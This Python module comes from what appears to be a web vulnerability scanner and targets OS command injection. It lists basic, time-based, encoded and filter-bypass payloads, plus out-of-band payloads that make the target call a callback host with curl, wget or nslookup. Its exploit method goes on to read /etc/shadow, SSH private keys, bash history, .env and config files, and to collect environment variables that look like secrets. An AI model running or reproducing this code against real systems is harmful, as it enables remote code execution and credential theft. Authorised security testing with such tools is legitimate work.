import re
import asyncio
from modules.base import BaseModule
from core.utils import extract_params, random_string
from core.http import inject_param


class CmdiModule(BaseModule):
    name = "cmdi"
    description = "OS Command Injection Scanner"
    exploitable = True
    
    success_patterns = [
        r"uid=\d+\(\w+\)\s+gid=\d+",
        r"root:.*:0:0:",
        r"Linux\s+\S+\s+\d+\.\d+",
        r"Darwin\s+\S+\s+\d+",
        r"Windows\s+NT",
        r"MINGW",
        r"Directory of",
        r"Volume Serial Number",
        r"total\s+\d+",
        r"drwx",
        r"-rw-",
        r"\d+\s+\w+\s+\w+\s+\d+",
    ]
    
    async def scan(self, target):
        self.findings = []
        self.oob_manager = self.config.get("oob_manager")
        params = extract_params(target)
        
        if params:
            await self._test_basic_injection(target, params)
            await self._test_blind_injection(target, params)
            
            if self.oob_manager:
                await self._test_blind_oob_injection(target, params)
            
            if self.aggressive:
                await self._test_encoded_injection(target, params)
                await self._test_filter_bypass(target, params)
        
        return self.findings
    
    async def _test_blind_oob_injection(self, target, params):
        token = self.oob_manager.generate_token()
        http_callback = self.oob_manager.get_http_url(token)
        dns_callback = self.oob_manager.get_dns_payload(token)
        
        oob_payloads = [
            (f";curl {http_callback}", "curl"),
            (f"|curl {http_callback}", "curl"),
            (f"`curl {http_callback}`", "curl"),
            (f"$(curl {http_callback})", "curl"),
            (f";wget {http_callback}", "wget"),
            (f"|wget {http_callback}", "wget"),
            (f";nslookup {dns_callback}", "nslookup"),
            (f"|nslookup {dns_callback}", "nslookup"),
            (f"`nslookup {dns_callback}`", "nslookup"),
            (f"$(nslookup {dns_callback})", "nslookup"),
            (f";ping -c 1 {dns_callback}", "ping"),
            (f"|ping -c 1 {dns_callback}", "ping"),
            (f"& ping -n 1 {dns_callback} &", "ping"),
            (f";host {dns_callback}", "host"),
            (f"|dig {dns_callback}", "dig"),
        ]
        
        for param in params:
            for payload, cmd_type in oob_payloads:
                await self.test_param(target, param, payload)
        
        await asyncio.sleep(3)
        
        interactions = self.oob_manager.check_interactions(token)
        if interactions:
            interaction = interactions[0]
            self.add_finding(
                "CRITICAL",
                f"Blind Command Injection CONFIRMED via OOB",
                url=target,
                evidence=f"Callback received: {interaction.get('type')} from {interaction.get('source_ip', 'unknown')}",
                confidence_evidence=["oob_callback_received", "blind_cmdi_confirmed", "rce_verified"],
                request_data={"method": "GET", "url": target, "callback_type": interaction.get('type')}
            )
            return True
        return False
    
    async def _test_filter_bypass(self, target, params):
        bypass_payloads = [
            (";i]d", "Bracket insertion"),
            (";i''d", "Quote insertion"),
            (";i\"\"d", "Double quote insertion"),
            (";$()i]d", "Nested command"),
            (";{id,}", "Brace expansion"),
            (";\nid", "Newline injection"),
            (";\rid", "Carriage return"),
            (";id\x00", "Null byte"),
            (";/???/??n/id", "Wildcard path"),
            (";/???/b]i]n/id", "Wildcard + bracket"),
        ]
        
        for param in params:
            for payload, bypass_type in bypass_payloads:
                resp = await self.test_param(target, param, payload)
                if resp.get("status"):
                    for pattern in self.success_patterns:
                        if re.search(pattern, resp.get("text", ""), re.IGNORECASE):
                            self.add_finding(
                                "CRITICAL",
                                f"Command Injection (filter bypass: {bypass_type})",
                                url=target,
                                parameter=param,
                                evidence=f"Bypass: {bypass_type}",
                                confidence_evidence=["filter_bypass", "cmdi_confirmed"],
                                request_data={"method": "GET", "url": target, "param": param, "payload": payload}
                            )
                            return
    
    async def _test_basic_injection(self, target, params):
        file_payloads = self.get_payloads("cmdi")
        base = [
            (";id", "id"),
            ("|id", "id"),
            ("||id", "id"),
            ("&id", "id"),
            ("&&id", "id"),
            ("`id`", "id"),
            ("$(id)", "id"),
            (";cat /etc/passwd", "passwd"),
            ("|cat /etc/passwd", "passwd"),
            ("`cat /etc/passwd`", "passwd"),
            ("$(cat /etc/passwd)", "passwd"),
            (";uname -a", "uname"),
            ("|uname -a", "uname"),
            (";whoami", "whoami"),
            ("|whoami", "whoami"),
            ("&dir", "dir"),
            ("|dir", "dir"),
            ("&type c:\\windows\\win.ini", "type"),
        ]
        extra = [(p, "id") for p in (file_payloads or []) if p and len(p) < 200]
        payloads = list(dict.fromkeys([(a, b) for a, b in base] + extra))[:80]
        for param in params:
            for payload, cmd_type in payloads:
                resp = await self.test_param(target, param, payload)
                if resp.get("status"):
                    for pattern in self.success_patterns:
                        if re.search(pattern, resp["text"], re.IGNORECASE):
                            self.add_finding(
                                "CRITICAL",
                                f"Command Injection",
                                url=target,
                                parameter=param,
                                evidence=f"Payload: {payload}"
                            )
                            return
    
    async def _test_blind_injection(self, target, params):
        marker = random_string(8)
        delay_payloads = [
            (";sleep 5", 5),
            ("|sleep 5", 5),
            ("||sleep 5", 5),
            ("&sleep 5", 5),
            ("&&sleep 5", 5),
            ("`sleep 5`", 5),
            ("$(sleep 5)", 5),
            (f";echo {marker}", 0),
            (f"|echo {marker}", 0),
            (";ping -c 5 127.0.0.1", 5),
            ("|ping -c 5 127.0.0.1", 5),
            ("& ping -n 5 127.0.0.1 &", 5),
        ]
        
        for param in params:
            baseline = await self.http.timed_get(target)
            if not baseline.get("status"):
                continue
            baseline_time = baseline.get("elapsed", 0)
            
            for payload, expected_delay in delay_payloads:
                resp = await self.http.timed_get(inject_param(target, param, payload))
                if resp.get("status"):
                    if marker in resp.get("text", ""):
                        self.add_finding(
                            "CRITICAL",
                            f"Blind Command Injection (echo marker)",
                            url=target,
                            parameter=param,
                            evidence=f"Marker {marker} reflected in response"
                        )
                        return
                    elapsed = resp.get("elapsed", 0)
                    if expected_delay > 0 and elapsed >= baseline_time + expected_delay - 1:
                        self.add_finding(
                            "CRITICAL",
                            f"Blind Command Injection (time-based)",
                            url=target,
                            parameter=param,
                            evidence=f"Delay: {elapsed:.2f}s (expected: {expected_delay}s)"
                        )
                        return
    
    async def _test_encoded_injection(self, target, params):
        encoded_payloads = [
            "%0aid",
            "%0a%0did",
            "%0d%0aid",
            "a]|id|[b",
            "a`id`b",
            "a$(id)b",
            "';id;'",
            '";id;"',
            "${IFS}id",
            ";${IFS}id",
            "%09id",
        ]
        
        for param in params:
            for payload in encoded_payloads:
                resp = await self.test_param(target, param, payload)
                if resp.get("status"):
                    for pattern in self.success_patterns:
                        if re.search(pattern, resp["text"], re.IGNORECASE):
                            self.add_finding(
                                "CRITICAL",
                                f"Command Injection (encoded bypass)",
                                url=target,
                                parameter=param,
                                evidence=f"Payload: {payload}"
                            )
                            return
    
    async def exploit(self, target, finding):
        param = finding.get("parameter")
        if not param:
            return None
        
        extracted = {"system_info": {}, "users": [], "network": [], "files": [], "env": {}}
        
        commands = [
            ("id", "system_info", "user_context"),
            ("whoami", "system_info", "current_user"),
            ("hostname", "system_info", "hostname"),
            ("uname -a", "system_info", "os_info"),
            ("cat /etc/passwd", "users", None),
            ("cat /etc/shadow", "users", None),
            ("ifconfig 2>/dev/null || ip addr", "network", None),
            ("netstat -tlnp 2>/dev/null || ss -tlnp", "network", None),
            ("env", "env", None),
            ("cat /etc/hosts", "network", None),
            ("ls -la /home/", "files", None),
            ("ls -la /root/", "files", None),
            ("cat ~/.bash_history", "files", None),
            ("cat ~/.ssh/id_rsa", "files", None),
            ("cat /var/www/html/.env 2>/dev/null", "files", None),
            ("cat /var/www/html/config.php 2>/dev/null", "files", None),
        ]
        
        separators = [";", "|", "&&", "$(", "`"]
        
        for cmd, category, key in commands:
            for sep in separators:
                if sep in ["$(", "`"]:
                    payload = f"{sep}{cmd})" if sep == "$(" else f"{sep}{cmd}`"
                else:
                    payload = f"{sep}{cmd}"
                
                resp = await self.test_param(target, param, payload)
                if resp.get("status") == 200 and resp.get("text"):
                    text = resp["text"]
                    
                    output = self._extract_command_output(text, cmd)
                    if output:
                        if category == "system_info" and key:
                            extracted["system_info"][key] = output
                        elif category == "users":
                            if "root:" in output:
                                users = re.findall(r'^([^:]+):[^:]*:(\d+):', output, re.MULTILINE)
                                extracted["users"] = [{"name": u[0], "uid": u[1]} for u in users]
                        elif category == "network":
                            extracted["network"].append({"cmd": cmd, "output": output[:500]})
                        elif category == "files":
                            extracted["files"].append({"path": cmd.split()[-1], "content": output[:1000]})
                        elif category == "env":
                            env_vars = re.findall(r'([A-Z_]+)=(.+)', output)
                            for k, v in env_vars:
                                if any(s in k.lower() for s in ["pass", "key", "secret", "token", "auth"]):
                                    extracted["env"][k] = v
                        
                        self.add_finding(
                            "CRITICAL",
                            f"CMDI EXPLOITED: {cmd} executed",
                            url=target,
                            parameter=param,
                            evidence=output[:300]
                        )
                        break
        
        if extracted["system_info"] or extracted["users"] or extracted["env"]:
            self.exploited_data = extracted
            return extracted
        
        return None
    
    def _extract_command_output(self, text, cmd):
        if "id" == cmd:
            match = re.search(r'uid=\d+\([^)]+\)\s*gid=\d+\([^)]+\)[^\n]*', text)
            if match:
                return match.group(0)
        elif "passwd" in cmd:
            if "root:" in text:
                start = text.find("root:")
                end = text.find("\n", start + 100) if start != -1 else -1
                if end == -1:
                    end = start + 500
                return text[start:end]
        elif "uname" in cmd:
            match = re.search(r'Linux\s+\S+\s+\d+\.\d+[^\n]*', text)
            if match:
                return match.group(0)
        
        for pattern in self.success_patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 20)
                end = min(len(text), match.end() + 200)
                return text[start:end]
        
        return None